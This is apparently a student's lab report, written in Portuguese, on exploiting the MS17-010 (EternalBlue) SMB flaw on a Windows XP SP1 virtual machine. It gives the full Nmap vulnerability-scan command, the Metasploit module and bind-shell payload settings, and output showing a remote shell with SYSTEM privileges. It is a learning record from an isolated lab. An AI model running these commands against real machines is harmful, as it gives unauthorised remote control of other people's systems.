# 💻 Relatório de Exploração - Windows XP SP1 (MS17-010 - EternalBlue)

> 🚨 **AVISO**: Este relatório foi criado em ambiente isolado e controlado, apenas para fins educacionais e de laboratório. Nenhuma ação foi realizada contra sistemas reais ou em produção.

---

## 📌 Descrição

Este relatório documenta a exploração bem-sucedida de uma vulnerabilidade SMB (MS17-010) em uma máquina virtual Windows XP SP1, utilizando o framework Metasploit.  
A vulnerabilidade foi descoberta através de varredura com o Nmap e confirmada por scripts de detecção de vulnerabilidades.  
Após isso, foi selecionado e configurado um exploit com payload, resultando na obtenção de uma shell remota no sistema alvo.

---

## 🖥️ Ambiente de Laboratório

| Item            | Detalhes                              |
|-----------------|----------------------------------------|
| Atacante        | Kali Linux (Host)                      |
| Alvo            | Windows XP SP1 (VM)                    |
| IP do atacante  |                           |
| IP do alvo      | 192.168.0.112                          |
| Ferramentas     | Nmap, Metasploit                       |

---

## 🛠️ Ferramentas Utilizadas

- **Nmap** para descoberta de portas e serviços:
  ```bash
  nmap -sV -p- --script vuln -O 192.168.0.112
  ```

- **Metasploit** para exploração:
  - Exploit: `windows/smb/ms17_010_psexec`
  - Payload: `windows/shell/bind_tcp`

---

## 📡 Etapas do Ataque

### 1. Descoberta do alvo
Com o Nmap, foram identificadas portas abertas e o sistema operacional alvo:

```bash
nmap -sV -p- --script vuln -O 192.168.0.112
```

Resultado:
- Porta 445/TCP (SMB) vulnerável à **MS17-010**

---

### 2. Execução do Exploit no Metasploit

```bash
use exploit/windows/smb/ms17_010_psexec
set rhost 192.168.0.112
set payload windows/shell/bind_tcp
exploit
```

Saída importante:
```
[+] SYSTEM session obtained!
[*] Uploading payload... DTMpZLxa.exe
[*] Command shell session 2 opened
```

---

### 3. Shell Obtida com Sucesso

Sessão iniciada com sucesso como SYSTEM:

```bash
C:\WINDOWS\system32>dir
 Volume in drive C has no label.
 Directory of C:\WINDOWS\system32

 04/03/2025  02:03 PM    <DIR>          .
 04/03/2025  02:03 PM    <DIR>          ..
 ...
```

---

## ✅ Resultado Final

- ✅ **Shell remota** obtida com sucesso  
- ✅ Acesso com privilégios de **SYSTEM**  
- ✅ Exploração 100% funcional do exploit EternalBlue (MS17-010)

---

## 📘 Observações Finais

- Esse foi meu **primeiro acesso bem-sucedido** a um sistema vulnerável usando o Metasploit.  
- A combinação de estudo, prática e exploração real reforçou meu entendimento sobre exploits e payloads.  
- Este relatório será guardado como parte da minha jornada de aprendizado em cibersegurança.

---

**🗓️ Data:** 04 de April de 2025  
**🔐 Autor:** Diego Ryan
